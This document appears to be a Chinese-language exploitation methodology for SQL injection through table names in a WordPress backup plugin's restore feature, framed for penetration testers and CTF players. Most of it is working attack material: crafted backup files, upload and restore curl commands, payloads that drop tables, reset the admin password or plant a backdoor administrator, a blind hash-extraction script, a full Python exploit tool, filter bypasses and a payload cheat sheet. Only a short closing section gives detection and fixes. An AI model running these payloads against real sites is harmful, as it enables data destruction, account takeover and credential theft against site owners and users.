# SQL 表名注入攻击

## 1. 概述

本文档描述针对数据库备份恢复功能的 SQL 表名注入攻击方法论。攻击者通过构造恶意备份文件，在表名中嵌入 SQL 注入 payload，在恢复过程中利用表名未验证直接拼接的漏洞执行任意 SQL 命令。

### 1.1 漏洞本质

备份恢复引擎从 SQL 备份文件中提取表名时，使用简单的字符串分割（如 `explode('`', $line)[1]`），未进行任何验证或 sanitization。提取的表名随后被直接拼接到 SQL 查询中（DESCRIBE、SELECT、UPDATE、DROP、ALTER 等），导致 SQL 注入漏洞。

### 1.2 适用范围

- WordPress Backup Migration 插件 v1.3.5 及类似备份插件
- 任何从备份文件解析表名并执行 SQL 操作的应用
- 使用字符串拼接而非参数化查询的数据库恢复功能
- CTF 挑战中存在备份恢复功能的应用

### 1.3 读者对象

- 执行数据库渗透测试的安全工程师
- CTF 竞赛参赛者
- 进行代码审计的安全分析师

---

## 2. 攻击场景

### 2.1 前置条件

| 条件 | 要求 | 说明 |
|------|------|------|
| 认证 | 任意 WordPress 认证用户 | 由于 `is_admin()` 权限检查缺陷，Subscriber 级别即可利用 |
| 文件上传 | 能够上传备份文件 | 通过 `f=upload-backup` 端点 |
| 恢复操作 | 能够触发恢复操作 | 通过 `f=restore-backup` 端点 |

### 2.2 注入点位置

| 代码位置 | 操作类型 | 注入方式 |
|----------|----------|----------|
| `DESCRIBE [table]` | 表结构查询 | 无 backticks 包裹 |
| `SELECT COUNT(*) FROM \`[table]\`` | 数据计数 | backticks 可逃逸 |
| `UPDATE \`[table]\` SET...` | 数据更新 | backticks 可逃逸 |
| `DROP TABLE IF EXISTS \`[table]\`` | 表删除 | backticks 可逃逸 |
| `ALTER TABLE \`[old]\` RENAME TO \`[new]\`` | 表重命名 | 双注入点 |

### 2.3 攻击复杂度

| 因素 | 评级 | 说明 |
|------|------|------|
| 前置条件 | 🟡 MEDIUM | 需要认证 + 文件上传能力 |
| 利用难度 | 🟢 LOW | 直接字符串拼接，无需复杂绕过 |
| 可靠性 | 🟢 HIGH | 无条件执行（某些路径） |
| 影响范围 | 🔴 CRITICAL | 完整数据库控制权 |

---

## 3. 漏洞探测方法

### 3.1 备份文件结构分析

**标准 WordPress 备份 SQL 文件格式:**

```sql
/* REAL_TABLE_NAME: `wp_posts`; */
CREATE TABLE IF NOT EXISTS `wp_posts` (
    ID bigint(20) unsigned NOT NULL AUTO_INCREMENT,
    post_author bigint(20) unsigned NOT NULL DEFAULT '0',
    ...
);

INSERT INTO `wp_posts` VALUES (1, 1, '...');
```

**表名提取代码:**

```php
// 脆弱的数据解析
$realTableName = explode('`', $objFile->current())[1];
// 输入：/* REAL_TABLE_NAME: `wp_posts`; */
// 输出：wp_posts
```

### 3.2 基础探测 Payload

**探测表名是否被注入:**

```sql
/* REAL_TABLE_NAME: `wp_posts`; DROP TABLE wp_users; --` */
CREATE TABLE IF NOT EXISTS `wp_posts`; DROP TABLE wp_users; --` (
    ID bigint(20) unsigned NOT NULL AUTO_INCREMENT
);
```

**执行流程分析:**

1. 解析器提取表名：`wp_posts`; DROP TABLE wp_users; --`
2. 拼接到 SQL: `DESCRIBE wp_posts`; DROP TABLE wp_users; --``
3. 实际执行:
   - `DESCRIBE wp_posts` (正常执行)
   - `DROP TABLE wp_users` (注入执行)

### 3.3 探测步骤

**步骤 1: 创建恶意备份文件**

```sql
-- File: malicious_backup.sql
/* REAL_TABLE_NAME: `wp_posts`; SELECT 12345; --` */
CREATE TABLE IF NOT EXISTS `wp_posts`; SELECT 12345; --` (
    ID bigint(20) unsigned NOT NULL AUTO_INCREMENT,
    PRIMARY KEY (ID)
);

INSERT INTO `wp_posts` VALUES (1, 1, 'test');
```

**步骤 2: 打包为 ZIP**

```bash
# 创建 manifest.json
cat > manifest.json << 'EOF'
{
    "backup_name": "malicious_backup",
    "backup_date": "2024-06-12",
    "site_url": "http://target:45513"
}
EOF

# 打包
zip malicious.zip malicious_backup.sql manifest.json
```

**步骤 3: 上传并恢复**

```bash
# 上传备份
curl -b /tmp/cookies.txt \
  -F "file_data=@malicious.zip" \
  "http://target:45513/wp-admin/admin-ajax.php?action=backup_migration&token=bmi&f=upload-backup&nonce=NONCE"

# 触发恢复
curl -b /tmp/cookies.txt \
  -d "action=backup_migration&token=bmi&f=restore-backup" \
  -d "nonce=NONCE" \
  -d "file=malicious.zip"
```

**步骤 4: 验证注入**

```bash
# 检查 wp_users 表是否被删除
docker exec mysql_container mysql -u wordpress -pwordpress -e "USE challenge; SHOW TABLES LIKE 'wp_users';"
```

---

## 4. 漏洞利用方法

### 4.1 利用方式一：DROP TABLE 注入 (INJ-VULN-06)

**目标:** 删除关键数据库表

**Payload 构造:**

```sql
/* REAL_TABLE_NAME: `wp_posts`; DROP TABLE wp_users; --` */
CREATE TABLE IF NOT EXISTS `wp_posts`; DROP TABLE wp_users; --` (
    ID bigint(20) unsigned NOT NULL AUTO_INCREMENT
);
```

**执行 SQL:**

```sql
-- 原始拼接
DROP TABLE IF EXISTS `wp_posts`; DROP TABLE wp_users; --`;

-- 实际执行
DROP TABLE IF EXISTS `wp_posts`;
DROP TABLE wp_users;
-- `;  (被注释)
```

**完整利用脚本:**

```sql
-- File: drop_tables.sql
/* REAL_TABLE_NAME: `wp_posts`; DROP TABLE wp_users; --` */
CREATE TABLE IF NOT EXISTS `wp_posts` (ID bigint);

/* REAL_TABLE_NAME: `wp_options`; DROP TABLE wp_options; --` */
CREATE TABLE IF NOT EXISTS `wp_options` (option_id bigint);

/* REAL_TABLE_NAME: `wp_usermeta`; DROP TABLE wp_usermeta; --` */
CREATE TABLE IF NOT EXISTS `wp_usermeta` (umeta_id bigint);
```

**影响:**
- `wp_users`: 删除所有用户账户
- `wp_options`: 删除站点配置
- `wp_usermeta`: 删除用户元数据

### 4.2 利用方式二：UPDATE 注入提权

**目标:** 修改管理员密码

**Payload 构造:**

```sql
/* REAL_TABLE_NAME: `wp_posts`; UPDATE wp_users SET user_pass='$P$BKNOWNHASH' WHERE user_login='admin'; --` */
CREATE TABLE IF NOT EXISTS `wp_posts`; UPDATE wp_users SET user_pass='$P$BKNOWNHASH' WHERE user_login='admin'; --` (
    ID bigint(20) unsigned NOT NULL AUTO_INCREMENT
);
```

**已知 PHPass Hash 生成:**

```bash
# 使用已知密码生成 hash
docker exec wordpress_container php -r "
require 'wp-load.php';
echo wp_hash_password('AdminPass123');
"
# 输出：\$P\$BQ/BTqqnL78yyFb92rdJbeRInZY27V/
```

**完整利用:**

```sql
-- File: privilege_escalation.sql
/* REAL_TABLE_NAME: `wp_posts`; UPDATE wp_users SET user_pass='\$P\$BQ/BTqqnL78yyFb92rdJbeRInZY27V/' WHERE user_login='admin'; --` */
CREATE TABLE IF NOT EXISTS `wp_posts` (ID bigint);
```

**后续操作:**
1. 恢复备份执行注入
2. 使用新密码登录 admin 账户
3. 获得管理员权限

### 4.3 利用方式三：INSERT 注入创建后门用户

**目标:** 创建新的管理员账户

**Payload 构造:**

```sql
/* REAL_TABLE_NAME: `wp_posts`; INSERT INTO wp_users (user_login, user_pass, user_email, user_registered, display_name) VALUES ('backdoor', '\$P\$BKNOWNHASH', 'backdoor@evil.com', NOW(), 'backdoor'); INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES (LAST_INSERT_ID(), 'wp_capabilities', 'a:1:{s:13:"administrator";b:1;}'); --` */
CREATE TABLE IF NOT EXISTS `wp_posts` (ID bigint);
```

**分步 Payload (更易读):**

```sql
-- 步骤 1: 创建用户
/* REAL_TABLE_NAME: `wp_posts`; INSERT INTO wp_users (user_login, user_pass, user_email) VALUES ('backdoor', '\$P\$BKNOWNHASH', 'backdoor@evil.com'); --` */
CREATE TABLE IF NOT EXISTS `wp_posts` (ID bigint);

-- 步骤 2: 授予管理员权限 (需要知道新用户 ID)
/* REAL_TABLE_NAME: `wp_options`; INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES ((SELECT ID FROM wp_users WHERE user_login='backdoor'), 'wp_capabilities', 'a:1:{s:13:"administrator";b:1;}'); --` */
CREATE TABLE IF NOT EXISTS `wp_options` (option_id bigint);
```

### 4.4 利用方式四：SELECT 注入数据外带

**目标:** 提取敏感数据

**盲注方式（通过响应时间）:**

```sql
/* REAL_TABLE_NAME: `wp_posts`; SELECT IF(SUBSTRING((SELECT user_pass FROM wp_users WHERE user_login='admin'),1,1)='$', SLEEP(5), 0); --` */
CREATE TABLE IF NOT EXISTS `wp_posts` (ID bigint);
```

**利用步骤:**

1. 发送上述 payload
2. 观察响应时间
3. 如果响应延迟 5 秒，说明第一个字符是 `$`
4. 逐字符提取完整 hash

**自动化脚本:**

```python
#!/usr/bin/env python3
import requests
import time

TARGET = "http://localhost:45513"
COOKIE = {"wordpress_logged_in": "SESSION"}
NONCE = "6028f64c82"

def extract_password_hash():
    extracted = ""
    for pos in range(1, 35):  # PHPass hash 长度
        for char in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789$/":
            payload = f"wp_posts`; SELECT IF(SUBSTRING((SELECT user_pass FROM wp_users WHERE user_login='admin'),{pos},1)='{char}', SLEEP(2), 0); --"
            
            sql_file = f"/* REAL_TABLE_NAME: `{payload}` */\nCREATE TABLE IF NOT EXISTS `wp_posts` (ID bigint);"
            
            # 上传并恢复 (简化示例)
            start = time.time()
            # ... 上传和恢复逻辑 ...
            elapsed = time.time() - start
            
            if elapsed >= 2:
                extracted += char
                print(f"[+] Position {pos}: '{char}' (total: {extracted})")
                break
    
    return extracted

hash_result = extract_password_hash()
print(f"[+] Admin password hash: {hash_result}")
```

### 4.5 利用方式五：UNION 注入数据外带

**目标:** 通过错误消息或响应内容提取数据

**Payload 构造:**

```sql
/* REAL_TABLE_NAME: `wp_posts`; SELECT 1,2,3,4,5 UNION SELECT user_login, user_pass, 3, 4, 5 FROM wp_users; --` */
CREATE TABLE IF NOT EXISTS `wp_posts` (
    ID bigint(20) unsigned NOT NULL AUTO_INCREMENT,
    post_author bigint(20) unsigned NOT NULL DEFAULT '0',
    post_date datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
    post_content text NOT NULL,
    post_title text NOT NULL
);
```

**执行 SQL:**

```sql
-- 原始拼接
SELECT COUNT(*) AS num FROM `wp_posts`; SELECT 1,2,3,4,5 UNION SELECT user_login, user_pass, 3, 4, 5 FROM wp_users; --`;

-- 实际执行
SELECT COUNT(*) AS num FROM `wp_posts`;
SELECT 1,2,3,4,5 UNION SELECT user_login, user_pass, 3, 4, 5 FROM wp_users;
-- `;
```

---

## 5. 绕过方法

### 5.1 绕过 backticks 保护

**场景:** 表名被 backticks 包裹

**绕过技术:**

```sql
-- 方法 1: 闭合 backtick
`wp_posts`; DROP TABLE wp_users; --`

-- 方法 2: 使用反引号内的反引号
`wp_posts``; DROP TABLE wp_users; --`

-- 方法 3: 利用 MySQL 注释
`wp_posts`/*comment*/; DROP TABLE wp_users; --`
```

### 5.2 绕过关键词过滤

**场景:** `DROP`、`UPDATE` 等关键词被过滤

**绕过技术:**

```sql
-- 使用大小写混合
dRoP TaBlE wp_users

-- 使用注释插入
DROP/**/TABLE wp_users

-- 使用双写
DRODROP TABLE wp_users  -- 如果过滤器只替换一次

-- 使用编码
%44%52%4F%50%20%54%41%42%4C%45  -- URL 编码
```

### 5.3 绕过长度限制

**场景:** 表名字段长度受限

**绕过技术:**

```sql
-- 使用内联注释缩短 payload
`a`;DROP TABLE wp_users;--`

-- 使用短表名引用
`wp_posts`;SELECT@/*
*/./*
*/FROM(wp_users);--`
```

### 5.4 多语句注入

**场景:** 需要执行多个 SQL 语句

**技术:**

```sql
-- 使用分号分隔
`wp_posts`; stmt1; stmt2; stmt3; --`

-- 使用 BEGIN...END 块
`wp_posts`; BEGIN stmt1; stmt2; END; --`

-- 使用存储过程调用
`wp_posts`; CALL proc1(); CALL proc2(); --`
```

---

## 6. 自动化利用脚本

### 6.1 Python 表名注入框架

```python
#!/usr/bin/env python3
"""
SQL Table Name Injection Exploit
Target: WordPress Backup Migration Plugin
"""

import requests
import zipfile
import io
import sys

class SQLTableNameInjection:
    def __init__(self, target, cookie, nonce):
        self.target = target
        self.cookie = {"wordpress_logged_in": cookie}
        self.nonce = nonce
    
    def create_malicious_sql(self, payload):
        """创建恶意 SQL 文件"""
        sql_content = f"""/* REAL_TABLE_NAME: `wp_posts`; {payload} --` */
CREATE TABLE IF NOT EXISTS `wp_posts` (
    ID bigint(20) unsigned NOT NULL AUTO_INCREMENT,
    PRIMARY KEY (ID)
);

INSERT INTO `wp_posts` VALUES (1, 1, 'test');
"""
        return sql_content
    
    def create_backup_zip(self, sql_content):
        """创建恶意备份 ZIP"""
        zip_buffer = io.BytesIO()
        
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            # 添加 SQL 文件
            zf.writestr('malicious_backup.sql', sql_content)
            
            # 添加 manifest
            manifest = """{
    "backup_name": "malicious",
    "backup_date": "2024-06-12",
    "site_url": "http://target"
}"""
            zf.writestr('manifest.json', manifest)
        
        zip_buffer.seek(0)
        return zip_buffer.getvalue()
    
    def upload_backup(self, zip_data):
        """上传恶意备份"""
        files = {'file_data': ('malicious.zip', zip_data, 'application/zip')}
        
        resp = requests.post(
            f"{self.target}/wp-admin/admin-ajax.php",
            cookies=self.cookie,
            params={
                'action': 'backup_migration',
                'token': 'bmi',
                'f': 'upload-backup'
            },
            data={'nonce': self.nonce},
            files=files
        )
        
        return resp.json()
    
    def restore_backup(self, filename):
        """触发恢复操作"""
        resp = requests.post(
            f"{self.target}/wp-admin/admin-ajax.php",
            cookies=self.cookie,
            data={
                'action': 'backup_migration',
                'token': 'bmi',
                'f': 'restore-backup',
                'nonce': self.nonce,
                'file': filename
            }
        )
        
        return resp.json()
    
    def exploit_drop_table(self, table_name):
        """DROP TABLE 注入"""
        payload = f"DROP TABLE {table_name}"
        sql = self.create_malicious_sql(payload)
        zip_data = self.create_backup_zip(sql)
        
        print(f"[*] Uploading malicious backup with DROP TABLE payload...")
        upload_result = self.upload_backup(zip_data)
        
        print(f"[*] Triggering restore...")
        restore_result = self.restore_backup('malicious.zip')
        
        return {
            'upload': upload_result,
            'restore': restore_result,
            'payload': payload
        }
    
    def exploit_update_user_password(self, username, new_hash):
        """UPDATE 注入修改密码"""
        payload = f"UPDATE wp_users SET user_pass='{new_hash}' WHERE user_login='{username}'"
        sql = self.create_malicious_sql(payload)
        zip_data = self.create_backup_zip(sql)
        
        print(f"[*] Uploading malicious backup with UPDATE payload...")
        self.upload_backup(zip_data)
        
        print(f"[*] Triggering restore...")
        self.restore_backup('malicious.zip')
        
        return {'payload': payload, 'target': username}

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <command>")
        print("Commands:")
        print(f"  {sys.argv[0]} drop wp_users")
        print(f"  {sys.argv[0]} update admin HASH")
        sys.exit(1)
    
    target = "http://localhost:45513"
    cookie = "SESSION_COOKIE"
    nonce = "6028f64c82"
    
    exploit = SQLTableNameInjection(target, cookie, nonce)
    
    command = sys.argv[1]
    
    if command == "drop":
        table = sys.argv[2]
        result = exploit.exploit_drop_table(table)
        print(f"[+] Result: {result}")
    
    elif command == "update":
        username = sys.argv[2]
        hash_val = sys.argv[3]
        result = exploit.exploit_update_user_password(username, hash_val)
        print(f"[+] Result: {result}")

if __name__ == "__main__":
    main()
```

---

## 7. 检测与防御

### 7.1 检测指标

| 指标 | 检测方法 |
|------|----------|
| 备份文件包含异常表名 | 扫描 SQL 文件中的特殊字符（`;`、`--`） |
| 恢复操作执行多条 SQL | 监控数据库查询日志 |
| 敏感表被删除/修改 | 数据库完整性监控 |
| 异常用户创建/修改 | 用户表变更监控 |

### 7.2 修复建议

**代码修复:**

```php
// 修复方案 1: 表名白名单验证
$allowed_tables = ['wp_posts', 'wp_users', 'wp_options', 'wp_usermeta'];
$realTableName = explode('`', $objFile->current())[1];

if (!in_array($realTableName, $allowed_tables, true)) {
    error_log("Invalid table name: {$realTableName}");
    continue;
}

// 修复方案 2: 字符验证（仅允许字母、数字、下划线）
if (!preg_match('/^[a-zA-Z0-9_]+$/', $realTableName)) {
    error_log("Invalid table name characters: {$realTableName}");
    continue;
}

// 修复方案 3: 使用标识符转义
$table = '`' . str_replace('`', '``', $realTableName) . '`';
$wpdb->query('DESCRIBE ' . $table);

// 修复方案 4: 完全避免动态表名
// 重构代码使用固定表名或映射表
```

**备份文件验证:**

```php
// 在解析前验证 SQL 文件内容
function validate_sql_file($content) {
    // 检查危险关键词
    $dangerous_patterns = [
        '/\bDROP\s+TABLE\b/i',
        '/\bDELETE\s+FROM\b/i',
        '/\bUPDATE\s+\w+\s+SET\b/i',
        '/\bINSERT\s+INTO\b/i',
        '/;\s*--/',  // 语句后跟注释
    ];
    
    foreach ($dangerous_patterns as $pattern) {
        if (preg_match($pattern, $content)) {
            return false;
        }
    }
    
    return true;
}
```

---

## 8. 参考资源

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [MySQL Identifier Quoting](https://dev.mysql.com/doc/refman/8.0/en/identifiers.html)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)
- [SQLMap Project](https://sqlmap.org/)

---

## 9. 附录：Payload 速查表

| 目标 | Payload |
|------|---------|
| DROP TABLE | `` `wp_posts`; DROP TABLE wp_users; --` `` |
| UPDATE 密码 | `` `wp_posts`; UPDATE wp_users SET user_pass='HASH' WHERE user_login='admin'; --` `` |
| INSERT 用户 | `` `wp_posts`; INSERT INTO wp_users VALUES (...); --` `` |
| UNION 查询 | `` `wp_posts`; SELECT 1,2,3 UNION SELECT user_login,user_pass,3 FROM wp_users; --` `` |
| 盲注时间 | `` `wp_posts`; SELECT IF(1=1,SLEEP(5),0); --` `` |
| 盲注布尔 | `` `wp_posts`; SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END; --` `` |
| 注释绕过 | `` `wp_posts`; DROP/**/TABLE/**/wp_users; --` `` |
| 大小写绕过 | `` `wp_posts`; DrOp TaBlE wp_users; --` `` |
